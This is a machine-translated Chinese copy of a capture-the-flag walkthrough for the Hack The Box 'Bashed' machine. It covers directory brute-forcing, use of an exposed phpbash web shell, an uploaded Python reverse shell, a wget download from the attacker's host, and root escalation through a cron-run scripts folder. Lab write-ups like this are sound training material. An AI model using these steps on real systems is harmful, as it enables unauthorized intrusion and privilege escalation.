# Bashed 走过

> 原文：<https://infosecwriteups.com/bashed-walk-through-36374a640bcc?source=collection_archive---------0----------------------->

![](img/49163ebae99309adef1cc96adfc992d5.png)

Bashed 是 Hackthebox 上的一个 CTF 盒子，它很快就要退役了，所以我想我应该写一个穿越。

所以像往常一样，我通过 nmap 扫描开始了对盒子的侦察，并发现了以下结果。

![](img/c0642defb144fc8584d6c6af0d21c64c.png)

Nmap 扫描结果

端口 80 打开，打开我的浏览器，输入 IP，我看到一个网页，我注意到的第一件事是这个..

![](img/f9186af181c5b8b980904a07be79ac45.png)

所以在服务器上有一个名为 phpbash 的文件，所以是时候暴力破解一些目录了，所以我用默认选项启动 DIRB 并找到了一些目录。

![](img/186c318e938096cb25248ecd6a6919ec.png)

在 dev 目录中，我找到了 phpbash 文件，它是即时 RCE。

![](img/706f9d407af623a555a5cebdc21cb310.png)![](img/6f9bef3de79fe14aaf71c6586e862a8c.png)

所以我得到了外壳和用户标志，但我对这个外壳不满意，所以它被放到了“ **tmp** 目录，我上传了我的 [**python 反向外壳**](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) 到那里，并连接到我的机器上。

![](img/453314c0ffe13b523c5ef01356ae204c.png)

所以下一步是检查 **PRIV ESC** ，所以我使用 [LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) 来检查**权限提升**，发现了一些有趣的东西。

![](img/0a4b2cf94f23d82ee95f0957926c051f.png)

我们可以在不提供密码的情况下从 www-data 更改为用户 scriptmanager(也可以通过键入 sudo -l 来检查这些)

所以我切换到 scriptmanager，通常命令是“ *sudo -u username* ”，但由于某种原因，我不能这样做，所以我想出了另一个主意

![](img/58e7ac94839df025f83145266cf87f0c.png)

我们还可以在切换到另一个用户时执行命令，例如在执行脚本管理器的 whoami 时，将类似于"*sudo-u script manager whoami "*将返回输出作为 **scriptmanager** 因此，我更改了我的 python shell 的端口，启动了一个 python HttpServer，并使用 wget，同时切换到脚本管理器" sudo-u script manager "**wget IP:8000/shell . py**

然后我启动了一个 netcat 监听器并执行了 python shell，这次我需要指定 python 的完整路径，并且我是 scriptmanager。

![](img/45f42c469599822a2e4556ec8d3b8c1d.png)![](img/fd7fdc957cbe4728092ffa117517e9ac.png)

当我执行“ **ls -la** ”时，我注意到一个名为 scripts 的目录。我看到 scripts 文件夹属于 scriptmanager，并且我发现 script 目录中的任何内容都由 root 每 2 或 3 分钟执行一次。(在 LinEnum.sh 输出中找到)

![](img/bc83edb587f011785b7d7b7766a0a0cb.png)

盒子里还有一个人

![](img/469e5723cbaff40735df3394fb60d8be.png)

shell 脚本再次将端口号 wget 更改为 box 并启动 netcat 监听器，现在这是一个等待的游戏，当 cronjob 执行时，我将获得一个 shell 作为 root

![](img/b8c5a8a14db11cf7ac6d504c1204c6d5.png)![](img/65f36ef172a09b582a0009508a3895e3.png)

玩 HTB 极大地帮助了我获得新的技能，结交来自其他国家的好朋友，玩得开心。

对于新来的人，我强烈推荐你观看 [Ippsec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA) 的视频

玩得开心…

这是[我](https://www.hackthebox.eu/home/users/profile/5938)

![](img/bd28899c170e96909f6670f4de167edb.png)